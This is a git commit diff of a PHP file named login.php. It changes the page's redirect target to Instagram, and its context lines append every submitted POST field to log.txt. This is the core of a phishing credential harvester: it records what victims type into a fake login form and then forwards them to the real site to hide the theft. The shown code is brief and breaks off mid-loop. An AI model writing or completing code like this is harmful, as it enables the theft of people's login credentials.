e6efef5c9ccc26e8853ad6ba72059b0429cf2ba4
MabrakaComed <74445752+MabrakaComed@users.noreply.github.com>
2022-04-05 01:19:41 +1030

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://mabrakacomedy.epizy.com');
+header ('Location: https://instagram.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
